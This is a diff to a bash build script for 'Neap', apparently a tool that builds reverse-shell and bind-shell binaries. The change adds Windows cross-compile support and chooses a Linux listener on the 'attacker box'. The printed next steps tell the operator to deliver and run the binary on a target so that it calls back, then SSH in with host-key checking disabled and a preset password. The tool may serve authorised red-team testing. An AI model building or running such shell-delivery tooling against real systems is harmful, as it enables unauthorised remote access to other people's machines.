@@ -320,25 +320,35 @@ build() {
         fi
     fi
 
+    # Is this a Windows cross-compile? The attacker box is assumed to be Linux,
+    # so a .exe can't be used as the local listener — we need a native
+    # Linux neap for that. We detect two ways: the --target triple, or the
+    # .exe suffix the copy step appended.
+    local target_is_windows=false
+    if [[ "$TARGET" == *windows* ]] || [[ "$safe_name" == *.exe ]]; then
+        target_is_windows=true
+    fi
+
+    # Pick the attacker-side listener binary (always a *Linux* binary).
+    #   - Native Linux build without --nocli: reuse the target binary.
+    #   - Anything else (--nocli, or Windows cross-compile): fall back to a
+    #     generic ./neap sitting next to it. If missing, the handler will
+    #     fail fast with an actionable message.
+    local listener_bin
+    if $target_is_windows || [ -n "$NOCLI" ]; then
+        listener_bin="neap"
+    else
+        listener_bin="$safe_name"
+    fi
+
     # ── Generate Handler Script ──
     mkdir -p "$HANDLER_DIR"
     local handler_file
     if [ "$MODE" = "reverse" ]; then
-        handler_file="$HANDLER_DIR/catch_${safe_name}.sh"
-        # Pick an attacker-side listener binary. The target-specific binary is
-        # reusable as a listener unless it was compiled with --nocli (which
-        # strips argument parsing and hard-codes dial-home mode). In the
-        # --nocli case, fall back to a generic bin/neap if one is present,
-        # otherwise point the user at the workaround.
-        local listener_bin
-        if [ -n "$NOCLI" ]; then
-            # Target binary has no CLI — it can't be told to listen. Prefer a
-            # generic ./neap next to it; if missing, the handler will fail fast
-            # with a clear message.
-            listener_bin="neap"
-        else
-            listener_bin="$safe_name"
-        fi
+        # Keep the handler filename .sh (never .exe.sh — the handler is a
+        # bash script run on the attacker box, regardless of target OS).
+        local handler_stem="${safe_name%.exe}"
+        handler_file="$HANDLER_DIR/catch_${handler_stem}.sh"
 
         cat > "$handler_file" <<HANDLER
 #!/usr/bin/env bash
@@ -378,7 +388,10 @@ HANDLER
         chmod +x "$handler_file"
         success "Handler: $handler_file"
     else
-        handler_file="$HANDLER_DIR/connect_${safe_name}.sh"
+        # Listen (bind) mode handler — strip .exe from the stem so the
+        # file is connect_neap_listen_4444.sh, not connect_*.exe.sh.
+        local handler_stem="${safe_name%.exe}"
+        handler_file="$HANDLER_DIR/connect_${handler_stem}.sh"
         cat > "$handler_file" <<HANDLER
 #!/usr/bin/env bash
 # Handler for Neap bind shell — auto-generated
@@ -427,26 +440,38 @@ NEXEC
     # The handler scripts are convenience wrappers — users can always drive
     # the binary directly. Show the binary invocation as the primary command
     # so nothing in the output implies the handler is required.
+    #
+    # For Windows cross-compiles the listener must still run on the Linux
+    # attacker box, so the listener command references a native Linux neap
+    # (not the .exe produced for the target).
+    local handler_stem="${safe_name%.exe}"
     echo ""
     echo -e "${TEAL}Next steps:${RESET}"
     if [ "$MODE" = "reverse" ]; then
         echo -e "  ${TEXT}1. Start the listener on this (attacker) host:${RESET}"
-        echo -e "       ${GREEN}$OUTPUT_DIR/$safe_name -l -p $PORT -v${RESET}"
-        echo -e "       ${SUBTEXT}(or run the convenience handler: $HANDLER_DIR/catch_${safe_name}.sh)${RESET}"
+        if $target_is_windows; then
+            # .exe won't run on Linux — use a native neap. If one isn't
+            # built yet, point the user at how to make one.
+            echo -e "       ${GREEN}$OUTPUT_DIR/neap -l -p $PORT -v${RESET}"
+            echo -e "       ${SUBTEXT}(if $OUTPUT_DIR/neap is missing: 'cargo build --release && cp target/release/neap $OUTPUT_DIR/')${RESET}"
+        else
+            echo -e "       ${GREEN}$OUTPUT_DIR/$safe_name -l -p $PORT -v${RESET}"
+        fi
+        echo -e "       ${SUBTEXT}(or run the convenience handler: $HANDLER_DIR/catch_${handler_stem}.sh)${RESET}"
         echo ""
-        echo -e "  ${TEXT}2. Deliver and run the same binary on the target:${RESET}"
+        echo -e "  ${TEXT}2. Deliver and run the $(${target_is_windows} && echo 'Windows ' || echo '')binary on the target:${RESET}"
         echo -e "       ${GREEN}./$safe_name${RESET}"
         echo ""
         echo -e "  ${TEXT}3. Once the target calls back, in another terminal:${RESET}"
         echo -e "       ${GREEN}ssh -o StrictHostKeyChecking=no -p $PORT $LUSER@127.0.0.1${RESET}"
         echo -e "       ${TEXT}Password: ${YELLOW}$PASSWORD${RESET}"
     else
-        echo -e "  ${TEXT}1. Deploy and start the bind-shell binary on the target:${RESET}"
+        echo -e "  ${TEXT}1. Deploy and start the $(${target_is_windows} && echo 'Windows ' || echo '')bind-shell binary on the target:${RESET}"
         echo -e "       ${GREEN}./$safe_name${RESET}"
         echo ""
         echo -e "  ${TEXT}2. SSH from this (attacker) host to the target:${RESET}"
         echo -e "       ${GREEN}ssh -o StrictHostKeyChecking=no -p $PORT $LUSER@<target-ip>${RESET}"
-        echo -e "       ${SUBTEXT}(or: $HANDLER_DIR/connect_${safe_name}.sh <target-ip>)${RESET}"
+        echo -e "       ${SUBTEXT}(or: $HANDLER_DIR/connect_${handler_stem}.sh <target-ip>)${RESET}"
         echo -e "       ${TEXT}Password: ${YELLOW}$PASSWORD${RESET}"
     fi
     echo ""
